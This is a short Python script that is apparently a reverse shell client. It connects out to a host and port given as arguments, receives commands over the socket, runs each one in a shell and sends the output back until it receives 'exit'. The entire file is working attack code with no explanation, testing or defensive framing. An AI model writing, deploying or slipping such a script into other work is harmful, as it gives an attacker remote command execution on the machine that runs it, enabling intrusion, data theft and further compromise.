import socket
import sys

from subprocess import Popen, PIPE

HOST = sys.argv[1]
PORT = int(sys.argv[2])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

while True:
    command = client.recv(1024).decode()

    if command.strip() == "exit" or not command:
        break

    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    output, err = process.communicate()

    client.send(output + err)

client.close()
